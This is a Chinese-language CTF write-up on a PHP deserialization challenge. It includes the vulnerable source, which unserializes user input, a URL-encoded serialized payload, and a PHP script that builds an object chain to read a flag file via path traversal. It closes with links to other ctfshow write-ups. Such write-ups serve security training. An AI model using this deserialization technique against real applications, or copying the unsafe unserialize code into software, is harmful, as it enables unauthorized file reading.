[TOC]

一次反序列化例题。2023.10.5

```
<?php  
include 'flag.php';
class pkshow 
{  
    function echo_name()     
    {          
        return "Pk very safe^.^";      
    }  
} 

class acp 
{   
    protected $cinder;  
    public $neutron;
    public $nova;
    function __construct() //3，要调用的是ace中的echo_name，但这边实例化的是pksshow所以，要修改它。
    {      
        $this->cinder = new pkshow;
    }  
    function __toString()      
    {          
        if (isset($this->cinder))  
            return $this->cinder->echo_name(); //2，从这调用，
    }  
}  

class ace
{    
    public $filename;     
    public $openstack;
    public $docker; 
    function echo_name()      
    {   
        $this->openstack = unserialize($this->docker);
        $this->openstack->neutron = $heat;
        if($this->openstack->neutron === $this->openstack->nova)
        {
        $file = "./{$this->filename}";
            if (file_get_contents($file)) //1，从这个函数拿到flag，那么，如何调用这个函数呢， 
            {              
                return file_get_contents($file); 
            }  
            else 
            { 
                return "keystone lost~"; 
            }    
        }
    }  
}  

if (isset($_GET['pks']))  
{
    $logData = unserialize($_GET['pks']);
    echo $logData; 
} 
else 
{ 
    highlight_file(__file__); 
}
?>
```

题目

做反序列化的题要从里往外做，从如何拿到flag开始。

反序列化要拿到的是最后的反序列化对象，而函数，对象都只是手段，我们最终要拿到的是可以被解析的，正确的，反序列化对象。

```
O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A19%3A%22..%2Fnssctfasdasdflag%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3BN%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D
```

有了它就可以解题。不用拘泥于源码，要用而不是全用。

```
<?php  

class acp 
{   
    protected $cinder;  
    public $neutron;
    public $nova;
    function __construct($a)
	{
		$this->cinder=$a;
	}
}
class ace
{    
    public $filename="../nssctfasdasdflag";     
    public $openstack;
    public $docker; 
	function echo_name()      
    {   
        $this->openstack = unserialize($this->docker);
        $this->openstack->neutron = $heat;
        if($this->openstack->neutron === $this->openstack->nova)
        {
        $file = "./{$this->filename}";
            if (file_get_contents($file))         
            {              
                return file_get_contents($file); 
            }  
            else 
            { 
                return "keystone lost~"; 
            }    
        }
    }  
}

$b = new ace();
$b->docker=null;
$a = new acp($b);
echo urlencode(serialize($a))

?>
```

###### 去杂  c绕过 filterchain base64去杂

[欢迎回来 ᕕ(◠ڼ◠)ᕗ ctfshow元旦水友赛 | 雲流のLowest World (c1oudfl0w0.github.io)](https://c1oudfl0w0.github.io/blog/2023/12/31/ctfshow元旦水友赛/)

[[ctfshow 2023元旦水友赛\]web题解_

[CTFshow元旦水友赛官方WP (qq.com)](https://docs.qq.com/doc/DRlBMcWdhZW9ZUnFB?groupUin=Wwq6gf%2FNtUosizeYbx%2Fepg%3D%3D)

[ctfshow元旦水友赛 easy_web_ctfshow元旦水友赛misc 以假乱真-CSDN博客](https://blog.csdn.net/m0_64016126/article/details/135368226?ops_request_misc=&request_id=&biz_id=102&utm_term=ctfshow 元旦水友赛&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-135368226.142^v99^pc_search_result_base1&spm=1018.2226.3001.4187)